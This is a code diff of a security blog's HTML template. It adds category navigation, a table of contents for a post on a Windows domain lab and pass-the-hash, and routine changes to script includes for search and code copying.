href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/">AI</a><span class="hacker-category-list-count">1</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">39</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/SRC/">SRC</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">20</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">6</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">12</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">8</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
   </div>
 </div>
 
@@ -448,11 +664,17 @@ window.addEventListener('load', function() {
   margin-left: 5px;
 }
 </style>
+
 	</div>
 
 	<!-- article TOC placed below the category list; should scroll with page -->
 	<div class="toc-wrapper">
 		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91%E6%A6%82%E8%A7%88"><span class="toc-article-text">一、环境拓扑概览</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BA%8C%E3%80%81Mermaid-%E5%9F%9F%E5%85%B3%E7%B3%BB%E5%9B%BE"><span class="toc-article-text">二、Mermaid 域关系图</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%89%E3%80%81%E6%A0%B8%E5%BF%83%E8%A1%A8%E6%A0%BC%EF%BC%9A%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%8F%8A%E7%99%BB%E5%BD%95%E5%85%B3%E7%B3%BB"><span class="toc-article-text">三、核心表格：账号密码及登录关系</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9B%9B%E3%80%81%E5%9F%9F%E7%99%BB%E5%BD%95%E6%9C%BA%E5%88%B6"><span class="toc-article-text">四、域登录机制</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BA%94%E3%80%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="toc-article-text">五、常用命令解析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%AD%E3%80%81%E5%BD%93%E5%89%8D%E7%8A%B6%E6%80%81%E9%AA%8C%E8%AF%81%EF%BC%88%E9%A2%84%E6%9C%9F%EF%BC%89"><span class="toc-article-text">六、当前状态验证（预期）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%83%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E7%A4%BA%E6%84%8F"><span class="toc-article-text">七、渗透测试攻击路径示意</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%AB%E3%80%81Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B8%8EPTH%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%EF%BC%88%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%A0%B8%E5%BF%83%EF%BC%89"><span class="toc-article-text">八、Windows认证机制与PTH哈希传递（横向渗透核心）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#8-1-Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6"><span class="toc-article-text">8.1 Windows认证体系核心组件</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#8-2-%E5%9F%9F%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E8%AF%A6%E8%A7%A3%EF%BC%9AKerberos-%E4%B8%BB%E6%B5%81%E7%A8%8B%E4%B8%8E-NTLM-%E5%9B%9E%E9%80%80%E6%9C%BA%E5%88%B6"><span class="toc-article-text">8.2 域登录认证详解：Kerberos 主流程与 NTLM 回退机制</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#8-4-PTH%E6%94%BB%E5%87%BB%E5%AE%9E%E6%93%8D%E7%A4%BA%E4%BE%8B%EF%BC%88%E9%92%88%E5%AF%B9%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-article-text">8.4 PTH攻击实操示例（针对当前环境）</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B9%9D%E3%80%81%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">九、注意事项</span></a></li></ol>
+			</div>
 		
 		</div>
 	</div>
@@ -481,7 +703,7 @@ window.addEventListener('load', function() {
 
 
   
-<a id="gotop" href="#">   
+<a id="gotop" href="#">
   <span>⬆︎TOP</span>
 </a>
 
@@ -490,7 +712,14 @@ window.addEventListener('load', function() {
 <script src="/js/bootstrap.min.js"></script>
 <script src="/js/main.js"></script>
 <script src="/js/toc.js"></script>
-<script src="/js/search.js"></script> 
+<script src="/js/copy-code.js"></script>
+
+   <script type="text/javascript">
+     var searchPath = "/search.xml";
+   </script>
+
+
+<script src="/js/search.js"></script>
 
 
 <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
@@ -501,16 +730,6 @@ window.addEventListener('load', function() {
 })(jQuery);
 </script>
 
-
-
-   <script type="text/javascript">      
-     var search_path = "search.xml";
-	 if (search_path.length == 0) {
-	 	search_path = "search.xml";
-	 }
-	 var path = "/" + search_path;
-     searchFunc(path, 'local-search-input', 'local-search-result');
-   </script>
 
 </body>
    </html>
